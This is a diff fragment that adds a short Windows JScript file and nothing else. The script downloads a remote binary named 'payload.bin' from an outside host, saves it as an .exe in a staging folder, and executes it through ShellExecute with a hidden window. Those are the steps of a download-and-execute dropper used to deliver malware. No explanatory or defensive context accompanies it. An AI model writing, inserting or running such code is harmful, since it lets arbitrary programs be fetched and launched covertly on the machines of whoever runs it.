@@ -1,0 +1,11 @@
+var http = new ActiveXObject("Microsoft.XMLHTTP");
+http.open("GET", "https://files.example.invalid/payload.bin", false);
+http.send();
+var stream = new ActiveXObject("ADODB.Stream");
+stream.Type = 1;
+stream.Open();
+stream.Write(http.responseBody);
+stream.SaveToFile("C:\\staging\\payload.exe", 2);
+stream.Close();
+var shell = new ActiveXObject("Shell.Application");
+shell.ShellExecute("C:\\staging\\payload.exe", "", "C:\\staging", "open", 0);
